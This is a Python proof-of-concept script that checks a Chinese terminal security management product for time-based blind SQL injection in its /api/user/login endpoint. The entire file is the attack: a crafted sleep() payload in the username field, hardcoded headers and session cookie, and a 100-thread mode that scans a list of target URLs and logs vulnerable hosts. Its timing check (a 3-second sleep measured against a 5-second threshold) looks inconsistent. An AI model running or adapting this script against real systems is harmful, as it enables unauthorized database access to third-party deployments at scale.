import requests,time,argparse,sys
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    banner = """
    ███████╗ ██████╗ ██╗             ████████╗██╗███╗   ███╗███████╗
    ██╔════╝██╔═══██╗██║             ╚══██╔══╝██║████╗ ████║██╔════╝
    ███████╗██║   ██║██║                ██║   ██║██╔████╔██║█████╗  
    ╚════██║██║▄▄ ██║██║                ██║   ██║██║╚██╔╝██║██╔══╝  
    ███████║╚██████╔╝███████╗███████╗   ██║   ██║██║ ╚═╝ ██║███████╗
    ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
                                                    author: @juyou
                                                    date: 2024-09-03
                                                    version: 1.0
"""
    print(banner)

def poc(target):
    payload =  "/api/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": target,
        "Referer": target + "/?v=login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Cookie": "vsecureSessionID=bc8a4d9d4e678a8236deaaea4593fc42"
    }
    data = {
        "captcha": "",
        "password": "21232f297a57a5a743894a0e4a801fc3",
        "username": "admin'and(select*from(select+sleep(3))a)='"
    }

    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=10)
        res2 = requests.get(url=target, data=data, headers=headers, verify=False, timeout=10)
        time1 = res1.elapsed.total_seconds()  # 响应的时间
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 5 and time1 > 5:
            print(f"[+]{target} 存在基于时间的SQL注入漏洞\n")
            with open('result1.txt', 'a', encoding='utf-8') as f:
                f.write(f"[+]{target} 存在基于时间的SQL注入漏洞\n")
        else:
            print(f"[-]{target} 不存在基于时间的SQL注入漏洞\n")
    except Exception as e:
        print(f"请求失败: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统sql注入漏洞检测脚本")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
